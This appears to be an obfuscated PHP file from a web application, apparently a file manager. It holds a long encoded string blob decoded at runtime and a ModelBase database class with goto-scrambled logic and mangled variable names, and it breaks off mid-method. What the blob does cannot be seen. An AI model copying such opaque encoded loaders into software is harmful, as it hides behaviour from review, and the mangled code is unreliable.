06\30\112\303\207\7\304\102\203\104\146\35\303".base64_decode('FlCEl7YxB5x0SzSWV5NSb3AJ3I/7ApFlUkYxJS4IoYsL68xHDh/QQR8l/ARVa0FBJzoUcVq8D7Fd').strrev('Šyøçà—|ª—oõ@İàP™ËXÿÙ0 W•]Àòßˆr*.YÃ1Lâ¢x8±u0QT™èŠ')."\101\55\224\125\103\345\154\200\166\325\204\210\137\321\227\250\51\2\2\364\105\306\255\311\131\267\262\357\124\130\71\363\70\306\41\57\230\11\366\264\170\110\304\127\375\204\25\2\372\62\0\313\57\327\177\53\122"."\37\65\344\312\235\322\6\211\12\267\327\226\347\377\110\62\330\35\312\52\45\165\34\26\162\204\3\113\172\242\123\25\127\201\255\246\370\333\176\266\312\250\51\52\101\62\267\340\100\156\104\345\141\115\36\113\235".strrev('	Y@ÈÓ›mÔq—ãŒ,19lJÔd5R´É.ˆÂ<!ÀUÈğ1 ¢ÌıÆ¼=Ÿç² ').base64_decode('HpDc9BiSuQmHp9F+6o/HZdIQBHNrVJiRPjpGK4ujdre5WYvcXIkL0iRubs8QpA6pEXlt4C5OpXb6')."\x98\x0\x6c\x3c\x36\x81\x46\xf\xaf\xf9\xf3\x45\xd3\x62\x1e\xdd\xa3\x1a\xfc\x51\x10\x24\x3a\xf0\x2d\x12\x94\xc7\xb4\xfc\x44\x5\xc0\x62\x7f\xdf\x4b\xab\xc1\x3c\xad\x42\xd3\x92\x42\x5a\x13\x5b\x86\x58\x96\x1f\xb0\x6\x7\xa\x61".base64_decode('s2sHPL02Q4gIepWyYs0+ZVmGnddzEQTMaWgownWVKUQQOCzcE0UEYkOGq4LnffoLfeMwwRTWVyiQ')."\x98\x3b\xc5\xc8\x2f\x65\x94\xf6\xa2\xc1\x0\x7a\x89\x3a\x9\xa5\x52\x18\xad\x48\xec\x53\xb8\xfe\x1a\xa9\xab\xc3\xc6\xfb\xa1\x67\x3a\xb9\xc0\x18\xe\x1c\x46\x80\x84\xdd\x12\x81\x0\x9f\x8\x34\x4d\xa0\x1a\xac\xd9\x1e\xc6\x9e\x1f"."\x5d\xd8\x87\x6\x15\x61\x32\x2a\x73\xef\x6a\x41\x23\xb3\x4\xec\x36\xa6\xf4\xf6\x42\x96\x45\xec\xf9\xa5\x54\x8\xe0\x17\x9\x2c\x50\x5d\x90\xd4\x45\x57\xc1\xd8\xc7\xd\x77\xf6\x4e\xd0\xc1\xd7\x42\xd8\xa9\xd\x99\xc7\x62\x91\xd4"."\xb1\x10\xfa\x81\xb2\x3c\x20\x73\x66\x11\xed\xae\x74\x44\x4\x3d\x53\x32\xa9\x83\x7b\x72\x25\x5e\xa1\x5c\xa2\x28\x4d\x10\xa4\x76\x89\x4e\x33\xc3\xb4\x90\x1f\x94\x54\x80\x10\xe3\x40\x1\x44\xd3\xa2\xbc\x55\x1d\x6a\xa1\x69\x84\xc2"._kodDe('MvjyF6myteL65RQV3RJVrnXLJHSemlsSvD5M5JXm8udx812PWn1vVncO4DE5bg8e0ePz28OzrLToCg==')."\206\363\24\336\35\164\42\144\24\376\101\130\303\250\370\161\213\0\150\227\375\130\57\331\62\204\355\75\31\325\52\135\64\160\317\113\205\122\236\273\270\2\21\253\54\214\167\11\324\271\305\267\64\267\244\347\34"."\110\313\326\101\137\42\164\340\207\151\35\226\42\120\205\342\246\320\140\46\204\331\206\253\342\143\377\101\351\304\357\57\222\203\201\104\201\175\136\340\244\66\164\107\122\35\115\265\320\45\330\210\362\323\147\374\162"."\151\321\316\137\127\346\123\315\55\163\26\210\133\117\76\214\334\225\16\271\25\240\317\166\223\271\312\10\103\262\322\231\104\237\113\25\147\66\112\264\272\57\46\17\334\12\174\321\306\277\376\243\351\340\251\46\245".base64_decode('4kzCYRgrWeiCal/5/9cDx6kkCj2/8pjVGRvZbvJkQdYUpWIwGh42v8xssJCbsDcZP//5n1eaCoey')."\xd5\x15\x17\x4a\xe5\xeb\x2c\x64\x1f\xf4\xcb\xf4\x84\x38\x63\x5b\x35\xf1\x52\x2d\x8c\xad\x70\x4e\xa2\x98\x41\x68\x99\x4f\xdf\xcc\xe6\x5b\x11\x90\x62\x41\x13\x56\x4e\x10\x63\x42\x3\x7f\x4a\xc\x56\x8c\xd6\x64\x8a\xbd\x3\x9d\xbb"."\xbc\x3a\xe8\xd1\x2\xee\x0\x4\x91\xa9\x85\x64\x85\x97\x78\xc5\x37\x0\x50\x41\x51\xc1\x77\x62\x65\xd1\x68\xf3\x4a\x2a\x49\x68\x16\xdd\xfc\x23\x2f\x79\x9e\x25\xec\x59\x7\x78\x2b\xca\xab\x0\x63\x9c\x51\x99\x1a\x4f\x31\x35\xeb"."\xcb\x32\x41\x7a\x4\x8\x76\xbf\x16\x59\x18\xc4\xb9\x9\x95\x30\xf3\x52\x36\xa0\x28\x97\x8\x33\x19\xcc\x30\x55\x90\x67\x89\xa0\xc7\x25\x27\xd4\x50\xc1\xb9\x11\xd9\x5f\xf3\x9e\xf2\x10\xb2\x4e\x39\xc4\xf7\x87\x41\x94\x51\x1d\x59"."\123\310\334\107\316\225\361\147\205\25\204\57\26\74\324\117\255\14\140\104\70\135\102\362\47\113\314\212\242\51\174\375\12\207\250\240\305\152\201\370\134\265\11\200\53\1\251\217\54\143\50\110\171\53\124\103\106".base64_decode('1r8wD+k9K69ADfqWtRAWx5x7CwuryLuniamEjByWGIlwGQ9pcAu3USjO3LbSd8voc2Yycy0DffKw')."\xdd\x17\x3e\xad\x22\x28\xb9\x1c\x5f\x27\xc4\xb7\x66\x72\x9\x59\x77\x1\x72\x1a\x35\xa9\xf\xb3\x6a\x11\xf1\x49\x85\x2a\x9b\x6\x2a\x81\xf0\x6\x14\xd4\xe4\x68\x15\x9f\x45\xb0\xb3\xa1\x76\x8f\xc0\xa2\x85\x85\xad\x2\x8d\x73\xd"._kodDe('Meudmh4HKa8vASC1dtfo9INvK6PZi6eo5UsIVDmJLOFfOLXliT0DqPJHdffDPfgL2fEvZr2SKzj0+w==')."\350\343\250\113\220\271\61\222\41\366\255\345\244\256\322\205\125\145\156\66\1\305\54\174\271\300\361\70\250\250\165\17\54\26\215\157\230\341\76\57\14\267\144\56\133\361\154\306\124\235\45\252\201\117\16\305\175"."\7\10\211\25\245\323\54\244\153\150\365\267\102\331\32\40\130\72\11\132\110\21\73\243\262\235\146\2\141\135\70\351\307\17\177\342\247\327\341\253\205\200\135\111\221\201\276\72\344\5\35\2\140\0\77\36\267"."\212\10\43\253\244\351\222\360\37\176\102\260\16\46\303\102\126\111\201\176\376\210\163\275\304\237\276\23\337\167\207\307\136\335\32\243\3\170\163\51\50\271\130\337\164\200\156\230\255\163\240\263\32\132\122\323\15"."\x1\x4d\x78\xb5\xe4\x28\xe8\x9d\x1e\x7\xfb\xd4\x2\x7d\x4a\x84\x90\x36\xcd\x4e\x46\x2\xc7\xaa\x95\xf\x6\x3e\x62\x5a\x86\x88\x3f\x77\x6f\x7f\xe6\x1e\xed\xf6\xf0\x6\xce\xb2\x8f\x23\xca\x3f\x22\x48\x38\xa8\x82\x1a\xee\x56\xcf"."\xb2\x28\x11\x81\xe9\x63\xa1\xa4\x4\xe1\x4\xde\x7a\x17\xc2\x9e\x35\xaf\xe0\x5b\x25\xb5\x57\x48\x46\xb9\xe8\x9b\x74\xe0\x17\x3e\xf7\x10\xe0\x2e\x20\x50\x32\x3e\x1f\xf4\x94\x65\xa6\x18\x63\xcf\x35\x60\x11\x86\x85\x9b\x93\x24\x22"."\110\276\143\101\31\23\240\226\350\37\117\121\265\347\60\263\252\236\352\122\13\51\73\176\251\220\140\120\216\16\6\243\253\32\30\10\122\234\165\333\340\302\52\303\231\247\134\346\247\350\134\4\115\245\272\345\162"."\25\124\146\260\315\240\0\302\120\221\344\43\274\112\303\135\22\53\143\342\327\11\136\272\162\215\201\210\225\120\376\152\215\275\135\150\32\61\70\271\314\50\10\216\335\10\271\161\20\302\111\62\237\177\270\50\350"."\340\331\5\335\152\163\147\200\270\216\154\47\311\77\151\175\134\207\241\61\251\14\340\40\325\167\247\5\152\363\212\14\317\342\350\152\153\113\42\333\130\241\370\252\273\135\13\51\364\12\305\211\167\47\123\146\210"."\124\377\10\247\127\153\27\13\17\21\361\4\272\250\151\226\316\27\170\53\153\30\301\14\213\211\226\352\330\207\26\355\36\70\135\142\140\36\35\164\341\64\217\65\11\343\53\266\332\213\31\354\55\303\71\364\212".strrev('¹Lù‡ØYšdŠŞ`“‹ÍVÌ™ªcòYµ.N`“†ÍUàòUjV¸©y°ˆ^K›ö=ÚşÚªy!ş')."\144\114\321\274\312\316\103\323\310\326\165\244\301\334\165\271\200\72\125\177\126\105\256\374\34\41\36\73\66\332\77\127\257\105\325\163\200\251\152\121\25\171\312\132\160\154\333\155\151\65\176\110\123\252\160\100\176"."\271\131\311\153\171\132\225\253\126\134\46\134\210\303\26\155\304\212\144\361\336\266\372\315\156\270\352\54\66\254\127\256\66\270\330\61\334\225\44\161\56\71\132\240\336\230\100\166\356\345\20\132\134\172\164\173\347".base64_decode('UNnO5jeY0l6hJPiqrep42AE3vJU7yhz11SW6ZcY7Ec1Uk4KKBwSKnoVxOv1Ijh+NEUkA39L5RI3l')."\167\157\75\171\347\35\127\356\334\172\371\316\63\327\157\377\371\371\216\35\247\155\331\161\361\206\35\27\157\332\276\361\362\355\27\134\205\23\166\134\162\342\173\27\234\271\120\332\261\341\247\60\161\363\51\357\334"."\171\53\376\167\373\257\156\177\167\353\335\73\357\332\212\121\266\137\177\373\273\327\157\331\171\316\125\73\116\375\335\216\363\56\333\161\356\251\107\10\235\2\352\255\163\7\205\226\333\305\52\351\56\176\42\153\161"."\x8f\x8d\x1e\x7a\x63\xc6\xee\x58\x2\x20\x67\xd2\xf8\xe2\x5\x29\xfd\x10\x48\xd7\x4\xdc\xaf\x39\xf0\xc2\x8a\x93\x23\x9a\x6e\x42\x23\x78\xb0\x20\x14\xd1\x6f\x97\x66\x9a\x94\x4f\x1\xa9\x1a\x61\x22\x39\x11\xf9\xd8\x11\xae\x93\x41"."\x88\x3f\xfd\xb\x87\x10\x1d\x87\x23\x62\x47\x4c\x9\x5\xc9\x15\x10\xdc\xdb\x46\x14\x9c\x8a\x58\x99\x25\x2\x8f\xd9\x59\x24\x5c\x79\x9e\xde\x5d\xb2\xdd\x39\x71\x0\xd8\x95\x26\xb4\x71\x42\x6b\xe8\x8d\x1e\x5e\x1f\x78\x1e\x4e\xba"."\305\56\13\362\367\27\10\261\213\227\343\110\113\315\160\343\24\67\321\150\167\242\62\234\344\65\111\246\321\106\262\247\320\344\144\136\72\277\255\4\162\104\310\213\300\317\235\243\143\246\376\140\64\356\137\21\210"."\104\43\25\111\41\117\44\62\30\14\373\260\126\154\105\62\312\45\150\42\124\44\205\172\202\375\123\245\371\373\74\201\336\212\64\250\231\0\165\165\351\203\247\70\51\20\102\265\364\364\366\122\325\270\312\132\4"."\xbc\xcb\x78\x4d\xd0\x5d\x1b\x3f\x7\x2e\x66\x35\x7a\xac\x6a\x53\xdb\xa1\xc7\xe6\x11\x99\xce\x46\xf1\x1\xf\x25\xcf\x8e\xb9\x84\x22\xac\x47\x10\xe2\x30\x1b\xf4\x11\x5e\x16\x28\x56\x6c\x51\x4\xe9\x2\x6a\xf\xf4\x93\xc2\xc2\xd4"."\x1\x25\x7c\x2d\x9e\x71\x16\x26\x2e\xa3\x6\x89\xaa\x49\xfc\x36\xd1\x65\xb9\x75\x14\xe0\x68\xb2\x20\xfe\x26\x10\xa1\xb8\x76\x23\x0\x51\xa5\xb5\xdd\xf1\xd8\x3a\xb0\xf2\x8e\xd3\x7e\x6f\xc8\x3b\x4\xd6\x7b\x29\x75\x40\x31\xa2\x25".base64_decode('hIsjzAItzE/U/8BhSzLgLVEtKmcIL4HSDI91TYhh8aykk7ESU87QG347lxeutGEv/R/P8iHinMUA')."\x0"."", 10, -8))); goto e©©Á¹óÔ; F½é±¼‘²: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\146\171\124\151\155\145", "\x74\151\155\x65", "\151\x6e\x73\145\162\x74\x2c\165\x70\144\141\x74\x65", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\x63\162\145\x61\x74\x65\124\151\x6d\x65", "\x74\x69\155\x65", "\151\x6e\163\x65\162\x74", "\x66\165\x6e\143\164\x69\157\156")); public function setDataAuto($D†»ÖŞ‘¨Ü) { $this->dataAuto = $D†»ÖŞ‘¨Ü; } public function __construct($B£æ¼¥ë = '', $F‡Ôàãª‡ = '', $b´Ô†Ê–¾Â = '') { parent::__construct($B£æ¼¥ë, $F‡Ôàãª‡, $b´Ô†Ê–¾Â); } public static function textEncode($B×°‘ª¾Áé) { if (!$B×°‘ª¾Áé) { return $B×°‘ª¾Áé; } $cñ´Ê´Œ‘ = json_encode($B×°‘ª¾Áé); $cñ´Ê´Œ‘ = preg_replace_callback($_SERVER[îÖ][342], function ($Aö–å°¹Õê) { return addslashes($Aö–å°¹Õê[0]); }, $cñ´Ê´Œ‘); return json_decode($cñ´Ê´Œ‘); } public static function textDecode($AÑ™Œ«ˆ) { $F¼‚ è’ =& $_SERVER[îÖ]; $Aš•˜‰ˆª› = json_encode($AÑ™Œ«ˆ); $Aš•˜‰ˆª› = preg_replace_callback($F¼‚ è’[343], function ($bø¡›Ë±¢£) { return $_SERVER[îÖ][93]; }, $Aš•˜‰ˆª›); return json_decode($Aš•˜‰ˆª›); } protected $tableMeta = array(); protected function _beforeInsert(&$CÒôİº»ò¸, $dàæ™İ˜Ñ) { $C¿Ğ´»»ë¿ =& $_SERVER[îÖ]; if (!$this->checkDataAutoHas($C¿Ğ´»»ë¿[344])) { return; } $this->dataBeforeFilter($CÒôİº»ò¸, $C¿Ğ´»»ë¿[344]); } protected function _beforeUpdate(&$eË›ÊÉº©ò, $B›’•Èî ¼) { $C­¼‚Éœ–ƒ =& $_SERVER[îÖ]; if (!$this->checkDataAutoHas($C­¼‚Éœ–ƒ[345])) { return; } $this->dataBeforeFilter($eË›ÊÉº©ò, $C­¼‚Éœ–ƒ[345]); } protected function _afterSelect(&$aŠ·†¼æ»ã, $FèŒãÃºï) { if (!is_array($aŠ·†¼æ»ã)) { return; } if (!$this->checkDataAutoHas($_SERVER[îÖ][346])) { return; } foreach ($aŠ·†¼æ»ã as &$e”§¿Œš«‹) { $this->dataAfterFilter($e”§¿Œš«‹); } } protected function _afterFind(&$EÙšá•è°ù, $DšÂ­Í‰Àİ) { if (!is_array($EÙšá•è°ù)) { return; } if (!$this->checkDataAutoHas($_SERVER[îÖ][346])) { return; } $this->dataAfterFilter($EÙšá•è°ù); } public function setAutoIncrement($eù†¤¢‹§ƒ) { $DÂÑåóïªß = array($this->getPk() => $eù†¤¢‹§ƒ); $bïæˆê¼ = $this->data($DÂÑåóïªß)->add(); if ($bïæˆê¼) { $this->delete($bïæˆê¼); } } public function getAutoIncrement() { $b¹ˆ™ï²ØÆ = $this->getTableName(); $f¡©©§·Ÿ¾ = $this->max($this->getPk()); $cğ²¶¥å = $this->query("\163\x68\157\167\x20\164\x61\x62\154\x65\x20\x73\164\141\x74\x75\163\40\x77\x68\145\162\x65\40\116\141\155\x65\75\47{$b¹ˆ™ï²ØÆ}\47"); $dñ³êõ»î = $cğ²¶¥å[0][$_SERVER[îÖ][347]]; $c·³¡›šó¼ = max($f¡©©§·Ÿ¾, $dñ³êõ»î); return $c·³¡›šó¼; } protected function _callBefore($FÍ¡–Ğ¤æ‚, $aéŒøØ²ó›) { return $this->cacheCallCheck($FÍ¡–Ğ¤æ‚, $aéŒøØ²ó›, !1); } protected function _callAfter($A¶ßÎß‚Ş, $e›¯ŞˆµƒÚ) { return $this->cacheCallCheck($A¶ßÎß‚Ş, $e›¯ŞˆµƒÚ, !0); } protected function cacheFunctionAlias($Cë“õ÷ÈÉ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($F°î‚†ÓÆ“, $C‰ªè¬ê«—, $cÄğïÍÅ¿ = false) { $e™ù”¾ÆŠ’ = $this->cacheFunctionAlias($C‰ªè¬ê«—); if (!$e™ù”¾ÆŠ’) { return; } foreach ($e™ù”¾ÆŠ’ as $Aå˜ßÜ‡ëŠ => $EôøÛ‰íÆ) { $F°çŒ–«¶Ñ = $EôøÛ‰íÆ[0]; $bì¼ÑÍ‹ÃÑ = explode($_SERVER[îÖ][47], $EôøÛ‰íÆ[1]); if ($F°î‚†ÓÆ“ == $Aå˜ßÜ‡ëŠ) { return $this->cacheFunctionGet($Aå˜ßÜ‡ëŠ, $F°çŒ–«¶Ñ); } if ($cÄğïÍÅ¿ && in_array($F°î‚†ÓÆ“, $bì¼ÑÍ‹ÃÑ)) { $this->cacheFunctionClear($Aå˜ßÜ‡ëŠ, $F°çŒ–«¶Ñ); } } } public function cacheFunctionGet($e°®¼‹‘Äœ, $cÄ…ÃéÅÙé) { $DˆšñÓªŒ = $this->cacheKeyMake($e°®¼‹‘Äœ, $cÄ…ÃéÅÙé); $BŒŠ¦à…˜ñ = Cache::get($DˆšñÓªŒ); if (!is_array($BŒŠ¦à…˜ñ)) { $BŒŠ¦à…˜ñ = call_user_func_array(array($this, $e°®¼‹‘Äœ), array($cÄ…ÃéÅÙé, !0)); Cache::set($DˆšñÓªŒ, $BŒŠ¦à…˜ñ); } return $BŒŠ¦à…˜ñ; } public function cacheFunctionClear($BÀî„öƒ’º, $E¤‰Æ†é§ª) { $aÖæç„ñ = $E¤‰Æ†é§ª; if (!is_array($E¤‰Æ†é§ª)) { $aÖæç„ñ = array($E¤‰Æ†é§ª); } foreach ($aÖæç„ñ as $BÒ‘øˆÊ) { $eÃ¢äá¾½£ = $this->cacheKeyMake($BÀî„öƒ’º, $BÒ‘øˆÊ); Cache::remove($eÃ¢äá¾½£); } } private function cacheKeyMake($eÂÅ¼»ö³Î, $b¥Æ¥ãÉ‹) { $a²ï‘¥çİ =& $_SERVER[îÖ]; return get_class($this) . $a²ï‘¥çİ[70] . $eÂÅ¼»ö³Î . $a²ï‘¥çİ[348] . $b¥Æ¥ãÉ‹; } protected function selectPage($BÂ‚®ÍÉßÑ = 200, $cÃÛ¶ÀÃ› = 1) { goto F¸‚İ’²òá; A–¬à—Ş¼Ë: $cì°·ê™“ = 4000; $BÂ‚®ÍÉßÑ = isset($in[$F°²Ùì²Û«[349]]) ? $in[$F°²Ùì²Û«[349]] : $BÂ‚®ÍÉßÑ; if ($BÂ‚®ÍÉßÑ === -1) { unset($in[$F°²Ùì²Û«[349]]); $cì°·ê™“ = 100000000; $BÂ‚®ÍÉßÑ = $cì°·ê™“; } goto a«šˆ÷Ğ²Á; Aó¥ÁÃç‰Š: $EöœêÀ™“ = intval($this->count()); $BÂ‚®ÍÉßÑ = intval($BÂ‚®ÍÉßÑ); $BÂ‚®ÍÉßÑ = $BÂ‚®ÍÉßÑ <= 5 ? 5 : ($BÂ‚®ÍÉßÑ >= $cì°·ê™“ ? $cì°·ê™“ : $BÂ‚®ÍÉßÑ); goto D§‹²ô«ô°; F¸‚İ’²òá: $F°²Ùì²Û« =& $_SERVER[îÖ]; global $in; $EÑ…‚¹ï¨‚ = $this->optionsValue(); goto A–¬à—Ş¼Ë; D§‹²ô«ô°: $d¢…âÑà›‘ = ceil($EöœêÀ™“ / $BÂ‚®ÍÉßÑ); $cÃÛ¶ÀÃ› = intval(isset($in[$F°²Ùì²Û«[340]]) ? $in[$F°²Ùì²Û«[340]] : $cÃÛ¶ÀÃ›); $cÃÛ¶ÀÃ› = $cÃÛ¶ÀÃ› <= 1 ? 1 : ($cÃÛ¶ÀÃ› >= $d¢…âÑà›‘ ? $d¢…âÑà›‘ : $cÃÛ¶ÀÃ›); goto bŠ„ÂöØÇé; a«šˆ÷Ğ²Á: $F§†äìíÚ› = $EÑ…‚¹ï¨‚; $F§†äìíÚ›[$F°²Ùì²Û«[350]] = array(); $this->optionsValue($F§†äìíÚ›); goto Aó¥ÁÃç‰Š; bŠ„ÂöØÇé: $this->optionsValue($EÑ…‚¹ï¨‚); $bÉ¨Éåºæ = $this->page($cÃÛ¶ÀÃ›, $BÂ‚®ÍÉßÑ)->select(); $bÉ¨Éåºæ = is_array($bÉ¨Éåºæ) ? $bÉ¨Éåºæ : array(); goto FøœÒ•ÔÕë; FøœÒ•ÔÕë: if ($d¢…âÑà›‘ == 1) { $EöœêÀ™“ = count($bÉ¨Éåºæ); } $EóªåÒİëË = array($F°²Ùì²Û«[351] => array($F°²Ùì²Û«[352] => $EöœêÀ™“, $F°²Ùì²Û«[349] => $BÂ‚®ÍÉßÑ, $F°²Ùì²Û«[340] => $cÃÛ¶ÀÃ›, $F°²Ùì²Û«[353] => $d¢…âÑà›‘), $F°²Ùì²Û«[354] => $bÉ¨Éåºæ ? $bÉ¨Éåºæ : array()); return $EóªåÒİëË; goto Aåšø³Ù×È; Aåšø³Ù×È: } protected function checkLength($A’•µ‘™ŒŒ, $a–Ş¾Äíø‹ = 0, $cÔ‰ÊŸ‡Ÿá = '') { $F‚…ó‰ÌÅë =& $_SERVER[îÖ]; $a–Ş¾Äíø‹ = $a–Ş¾Äíø‹ ? $a–Ş¾Äíø‹ : 65536; if (!$A’•µ‘™ŒŒ || strlen($A’•µ‘™ŒŒ) < $a–Ş¾Äíø‹) { return; } $cÔ‰ÊŸ‡Ÿá = $cÔ‰ÊŸ‡Ÿá ? $cÔ‰ÊŸ‡Ÿá . $F‚…ó‰ÌÅë[67] : $F‚…ó‰ÌÅë[33]; show_json($cÔ‰ÊŸ‡Ÿá . LNG($F‚…ó‰ÌÅë[355]) . "\x28{$a–Ş¾Äíø‹}\x29", !1); } protected function metaSet($dŠàÈÌàÊÃ, $cã²êáÖØ˜ = null, $EÔ­áæô«“ = null) { goto a“«ÊÄà™‰; CÒÁŠÌ›§œ: if (is_null($cã²êáÖØ˜)) { return $Cášç’ ù©->where(array($CîôÅù² => $dŠàÈÌàÊÃ))->delete(); } if (is_null($EÔ­áæô«“) && is_string($cã²êáÖØ˜)) { return $Cášç’ ù©->where($f¬Úôç½®¥)->delete(); } $D¾¥¥˜Ë“ = is_array($cã²êáÖØ˜) ? $cã²êáÖØ˜ : array(); goto F¸šöÒ˜Š; eÉÉé Œ: $c”ñÜ¹‹¬ˆ = $this->tableMeta[$Cóƒ”ˆ®¢§[357]]; $Cášç’ ù© = Model($c”ñÜ¹‹¬ˆ); $f¬Úôç½®¥ = array($CîôÅù² => $dŠàÈÌàÊÃ, $Cóƒ”ˆ®¢§[358] => $cã²êáÖØ˜); goto CÒÁŠÌ›§œ; dßŠá´„ƒ: $Cášç’ ù©->where(array($CîôÅù² => $dŠàÈÌàÊÃ))->addAll($F¡½±ç´ùË, array(), !0); return !0; goto Bƒğˆ¼ô; a“«ÊÄà™‰: $Cóƒ”ˆ®¢§ =& $_SERVER[îÖ]; if (!$this->tableMeta) { return !1; } $CîôÅù² = $this->tableMeta[$Cóƒ”ˆ®¢§[356]]; goto eÉÉé Œ; F¸šöÒ˜Š: if (is_string($cã²êáÖØ˜)) { $D¾¥¥˜Ë“[$cã²êáÖØ˜] = $EÔ­áæô«“; } $F¡½±ç´ùË = array(); foreach ($D¾¥¥˜Ë“ as $C®Ï¼à‚õ¡ => $dç¡ëÇ¼‡®) { $this->checkLength($dç¡ëÇ¼‡®, !1, $c”ñÜ¹‹¬ˆ . $Cóƒ”ˆ®¢§[4] . $C®Ï¼à‚õ¡); $F¡½±ç´ùË[] = array($CîôÅù² => $dŠàÈÌàÊÃ, $Cóƒ”ˆ®¢§[89] => $C®Ï¼à‚õ¡, $Cóƒ”ˆ®¢§[359] => $dç¡ëÇ¼‡®); } goto dßŠá´„ƒ; Bƒğˆ¼ô: } public function metaGet($DŸª•·Ãàô) { goto aÍ˜¾·æÄ×; aâ„ëÂ“¿: $Dà‰¨…½ŒÛ = Model($this->tableMeta[$a÷Ù‹¬‘©¿[357]]); $cí…ÃÔ¶–¦ = array($DÅ©ßĞîØÜ => $DŸª•·Ãàô); $AŠÒ¥íäó = $Dà‰¨…½ŒÛ->field($a÷Ù‹¬‘©¿[360])->where($cí…ÃÔ¶–¦)->select(); goto d¥í¦Ââ; aÍ˜¾·æÄ×: $a÷Ù‹¬‘©¿ =& $_SERVER[îÖ]; if (!$this->tableMeta) { return array(); } $DÅ©ßĞîØÜ = $this->tableMeta[$a÷Ù‹¬‘©¿[356]]; goto aâ„ëÂ“¿; d¥í¦Ââ: $AŠÒ¥íäó = array_to_keyvalue($AŠÒ¥íäó, $a÷Ù‹¬‘©¿[89], $a÷Ù‹¬‘©¿[359]); return $AŠÒ¥íäó; goto bôóÑ¶­ÓÃ; bôóÑ¶­ÓÃ: } private function checkDataAutoHas($DÛ¶Ó’•ë£) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Cƒíù¹¹Š) { if (in_array($DÛ¶Ó’•ë£, explode($_SERVER[îÖ][47], $Cƒíù¹¹Š[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$cáŠ®õ»Ù, $AÁÁÏ°÷) { $Fáö·ƒÒ×È =& $_SERVER[îÖ]; foreach ($this->dataAuto as $B‘ÌĞ‰¡Áß) { $C©•Èë¯ö = $B‘ÌĞ‰¡Áß[0]; if (!in_array($AÁÁÏ°÷, explode($Fáö·ƒÒ×È[47], $B‘ÌĞ‰¡Áß[2]))) { continue; } switch (trim($B‘ÌĞ‰¡Áß[3])) { case $Fáö·ƒÒ×È[309]: case $Fáö·ƒÒ×È[310]: $AÎ¢Ùä“‰ë = $B‘ÌĞ‰¡Áß[1]; $E¿ö­êµ–Æ = isset($B‘ÌĞ‰¡Áß[4]) ? (array) $B‘ÌĞ‰¡Áß[4] : array(); if ($AÎ¢Ùä“‰ë == $Fáö·ƒÒ×È[190] && array_key_exists($C©•Èë¯ö, $cáŠ®õ»Ù)) { if (!$cáŠ®õ»Ù[$C©•Èë¯ö]) { unset($cáŠ®õ»Ù[$C©•Èë¯ö]); } break; } if (isset($cáŠ®õ»Ù[$C©•Èë¯ö])) { array_unshift($E¿ö­êµ–Æ, $cáŠ®õ»Ù[$C©•Èë¯ö]); } if ($Fáö·ƒÒ×È[309] == $B‘ÌĞ‰¡Áß[3]) { $cáŠ®õ»Ù[$C©•Èë¯ö] = call_user_func_array($AÎ¢Ùä“‰ë, $E¿ö­êµ–Æ); } else { $cáŠ®õ»Ù[$C©•Èë¯ö] = call_user_func_array(array(&$this, $AÎ¢Ùä“‰ë), $E¿ö­êµ–Æ); } break; case $Fáö·ƒÒ×È[261]: $cáŠ®õ»Ù[$C©•Èë¯ö] = $cáŠ®õ»Ù[$B‘ÌĞ‰¡Áß[1]]; break; case $Fáö·ƒÒ×È[282]: if (isset($cáŠ®õ»Ù[$C©•Èë¯ö]) && !is_string($cáŠ®õ»Ù[$C©•Èë¯ö])) { $cáŠ®õ»Ù[$C©•Èë¯ö] = json_encode_force($cáŠ®õ»Ù[$C©•Èë¯ö]); } break; case $Fáö·ƒÒ×È[311]: if ($cáŠ®õ»Ù[$C©•Èë¯ö] === $Fáö·ƒÒ×È[33]) { unset($cáŠ®õ»Ù[$C©•Èë¯ö]); } break; case $Fáö·ƒÒ×È[312]: $cáŠ®õ»Ù[$C©•Èë¯ö] = $B‘ÌĞ‰¡Áß[1]; default: break; } } if ($AÁÁÏ°÷ == $Fáö·ƒÒ×È[344]) { $B—Ğ‡ÖÄ = strtolower($this->db->getDbType()); if (strpos($B—Ğ‡ÖÄ, $Fáö·ƒÒ×È[9]) !== 0) { return; } $Eë•öõ˜ğŠ = $this->field(!0)->fields; $B¸ÃÅÙ¶÷ = $Eë•öõ˜ğŠ[$Fáö·ƒÒ×È[240]]; if (isset($Eë•öõ˜ğŠ[$Fáö·ƒÒ×È[239]])) { unset($B¸ÃÅÙ¶÷[$Eë•öõ˜ğŠ[$Fáö·ƒÒ×È[239]]]); } foreach ($B¸ÃÅÙ¶÷ as $e®¹Ûš‹…¼ => $AÁÁÏ°÷) { if (!isset($cáŠ®õ»Ù[$e®¹Ûš‹…¼])) { $cáŠ®õ»Ù[$e®¹Ûš‹…¼] = $Fáö·ƒÒ×È[33]; } } } } private function dataAfterFilter(&$B©Âåº»—“) { $eÒ½à¸òÀØ =& $_SERVER[îÖ]; foreach ($this->dataAuto as $CŞç„½½”Å) { $cÎªø×£ÆŠ = $CŞç„½½”Å[0]; if (!in_array($eÒ½à¸òÀØ[346], explode($eÒ½à¸òÀØ[47], $CŞç„½½”Å[2]))) { continue; } if (!isset($B©Âåº»—“[$cÎªø×£ÆŠ])) { continue; } switch (trim($CŞç„½½”Å[3])) { case $eÒ½à¸òÀØ[309]: case $eÒ½à¸òÀØ[310]: $cµõğ’ = isset($CŞç„½½”Å[4]) ? (array) $CŞç„½½”Å[4] : array(); array_unshift($cµõğ’, $B©Âåº»—“[$cÎªø×£ÆŠ]); if ($eÒ½à¸òÀØ[309] == $CŞç„½½”Å[3]) { $B©Âåº»—“[$cÎªø×£ÆŠ] = call_user_func_array($CŞç„½½”Å[1], $cµõğ’); } else { $B©Âåº»—“[$cÎªø×£ÆŠ] = call_user_func_array(array(&$this, $CŞç„½½”Å[1]), $cµõğ’); } break; case $eÒ½à¸òÀØ[261]: $B©Âåº»—“[$cÎªø×£ÆŠ] = $B©Âåº»—“[$CŞç„½½”Å[1]]; break; case $eÒ½à¸òÀØ[282]: $EÙ’ó¬“Ù  = $B©Âåº»—“[$cÎªø×£ÆŠ]; $B©Âåº»—“[$cÎªø×£ÆŠ] = json_decode($EÙ’ó¬“Ù , !0); if (is_null($B©Âåº»—“[$cÎªø×£ÆŠ])) { $B©Âåº»—“[$cÎªø×£ÆŠ] = $EÙ’ó¬“Ù ; } break; 